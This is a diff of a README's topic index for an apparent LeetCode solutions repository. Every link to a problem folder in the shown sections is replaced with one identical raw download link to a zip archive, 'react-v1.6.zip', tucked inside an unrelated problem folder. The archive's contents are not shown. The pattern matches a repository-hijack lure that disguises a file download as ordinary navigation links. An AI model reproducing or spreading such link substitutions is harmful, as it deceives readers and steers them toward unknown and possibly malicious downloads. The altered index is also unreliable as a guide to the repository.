+| [0020-valid-parentheses](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [0084-largest-rectangle-in-histogram](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [0085-maximal-rectangle](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [0094-binary-tree-inorder-traversal](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [0144-binary-tree-preorder-traversal](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [0145-binary-tree-postorder-traversal](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [0155-min-stack](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [0232-implement-queue-using-stacks](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [0496-next-greater-element-i](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [0739-daily-temperatures](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [1047-remove-all-adjacent-duplicates-in-string](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [2130-maximum-twin-sum-of-a-linked-list](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
 ## Queue
 |  |
 | ------- |
-| [0232-implement-queue-using-stacks](https://github.com/muskan9567/react1/tree/master/0232-implement-queue-using-stacks) |
+| [0232-implement-queue-using-stacks](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
 ## Depth-First Search
 |  |
 | ------- |
-| [0094-binary-tree-inorder-traversal](https://github.com/muskan9567/react1/tree/master/0094-binary-tree-inorder-traversal) |
-| [0104-maximum-depth-of-binary-tree](https://github.com/muskan9567/react1/tree/master/0104-maximum-depth-of-binary-tree) |
-| [0144-binary-tree-preorder-traversal](https://github.com/muskan9567/react1/tree/master/0144-binary-tree-preorder-traversal) |
-| [0145-binary-tree-postorder-traversal](https://github.com/muskan9567/react1/tree/master/0145-binary-tree-postorder-traversal) |
-| [1391-check-if-there-is-a-valid-path-in-a-grid](https://github.com/muskan9567/react1/tree/master/1391-check-if-there-is-a-valid-path-in-a-grid) |
-| [1722-minimize-hamming-distance-after-swap-operations](https://github.com/muskan9567/react1/tree/master/1722-minimize-hamming-distance-after-swap-operations) |
-| [3559-number-of-ways-to-assign-edge-weights-ii](https://github.com/muskan9567/react1/tree/master/3559-number-of-ways-to-assign-edge-weights-ii) |
+| [0094-binary-tree-inorder-traversal](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [0104-maximum-depth-of-binary-tree](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [0144-binary-tree-preorder-traversal](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [0145-binary-tree-postorder-traversal](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [1391-check-if-there-is-a-valid-path-in-a-grid](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [1722-minimize-hamming-distance-after-swap-operations](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [3559-number-of-ways-to-assign-edge-weights-ii](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
 ## Union-Find
 |  |
 | ------- |
-| [1391-check-if-there-is-a-valid-path-in-a-grid](https://github.com/muskan9567/react1/tree/master/1391-check-if-there-is-a-valid-path-in-a-grid) |
-| [1722-minimize-hamming-distance-after-swap-operations](https://github.com/muskan9567/react1/tree/master/1722-minimize-hamming-distance-after-swap-operations) |
+| [1391-check-if-there-is-a-valid-path-in-a-grid](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [1722-minimize-hamming-distance-after-swap-operations](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
 ## Prefix Sum
 |  |
 | ------- |
-| [2574-left-and-right-sum-differences](https://github.com/muskan9567/react1/tree/master/2574-left-and-right-sum-differences) |
-| [2615-sum-of-distances](https://github.com/muskan9567/react1/tree/master/2615-sum-of-distances) |
-| [3225-maximum-score-from-grid-operations](https://github.com/muskan9567/react1/tree/master/3225-maximum-score-from-grid-operations) |
+| [2574-left-and-right-sum-differences](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [2615-sum-of-distances](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [3225-maximum-score-from-grid-operations](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
 ## Counting
 |  |
 | ------- |
-| [2833-furthest-point-from-origin](https://github.com/muskan9567/react1/tree/master/2833-furthest-point-from-origin) |
+| [2833-furthest-point-from-origin](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
 ## Breadth-First Search
 |  |
 | ------- |
-| [0104-maximum-depth-of-binary-tree](https://github.com/muskan9567/react1/tree/master/0104-maximum-depth-of-binary-tree) |
-| [1391-check-if-there-is-a-valid-path-in-a-grid](https://github.com/muskan9567/react1/tree/master/1391-check-if-there-is-a-valid-path-in-a-grid) |
+| [0104-maximum-depth-of-binary-tree](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [1391-check-if-there-is-a-valid-path-in-a-grid](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
 ## Monotonic Stack
 |  |
 | ------- |
-| [0084-largest-rectangle-in-histogram](https://github.com/muskan9567/react1/tree/master/0084-largest-rectangle-in-histogram) |
-| [0085-maximal-rectangle](https://github.com/muskan9567/react1/tree/master/0085-maximal-rectangle) |
-| [0496-next-greater-element-i](https://github.com/muskan9567/react1/tree/master/0496-next-greater-element-i) |
-| [0739-daily-temperatures](https://github.com/muskan9567/react1/tree/master/0739-daily-temperatures) |
+| [0084-largest-rectangle-in-histogram](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [0085-maximal-rectangle](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [0496-next-greater-element-i](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [0739-daily-temperatures](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
 ## Tree
 |  |
 | ------- |
-| [0094-binary-tree-inorder-traversal](https://github.com/muskan9567/react1/tree/master/0094-binary-tree-inorder-traversal) |
-| [0104-maximum-depth-of-binary-tree](https://github.com/muskan9567/react1/tree/master/0104-maximum-depth-of-binary-tree) |
-| [0144-binary-tree-preorder-traversal](https://github.com/muskan9567/react1/tree/master/0144-binary-tree-preorder-traversal) |
-| [0145-binary-tree-postorder-traversal](https://github.com/muskan9567/react1/tree/master/0145-binary-tree-postorder-traversal) |
-| [3559-number-of-ways-to-assign-edge-weights-ii](https://github.com/muskan9567/react1/tree/master/3559-number-of-ways-to-assign-edge-weights-ii) |
+| [0094-binary-tree-inorder-traversal](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [0104-maximum-depth-of-binary-tree](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [0144-binary-tree-preorder-traversal](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [0145-binary-tree-postorder-traversal](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [3559-number-of-ways-to-assign-edge-weights-ii](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
 ## Binary Tree
 |  |
 | ------- |
-| [0094-binary-tree-inorder-traversal](https://github.com/muskan9567/react1/tree/master/0094-binary-tree-inorder-traversal) |
-| [0104-maximum-depth-of-binary-tree](https://github.com/muskan9567/react1/tree/master/0104-maximum-depth-of-binary-tree) |
-| [0144-binary-tree-preorder-traversal](https://github.com/muskan9567/react1/tree/master/0144-binary-tree-preorder-traversal) |
-| [0145-binary-tree-postorder-traversal](https://github.com/muskan9567/react1/tree/master/0145-binary-tree-postorder-traversal) |
+| [0094-binary-tree-inorder-traversal](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [0104-maximum-depth-of-binary-tree](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [0144-binary-tree-preorder-traversal](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [0145-binary-tree-postorder-traversal](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
 ## Linked List
 |  |
 | ------- |
-| [2095-delete-the-middle-node-of-a-linked-list](https://github.com/muskan9567/react1/tree/master/2095-delete-the-middle-node-of-a-linked-list) |
-| [2130-maximum-twin-sum-of-a-linked-list](https://github.com/muskan9567/react1/tree/master/2130-maximum-twin-sum-of-a-linked-list) |
+| [2095-delete-the-middle-node-of-a-linked-list](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [2130-maximum-twin-sum-of-a-linked-list](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
 <!---LeetCode Topics End-->
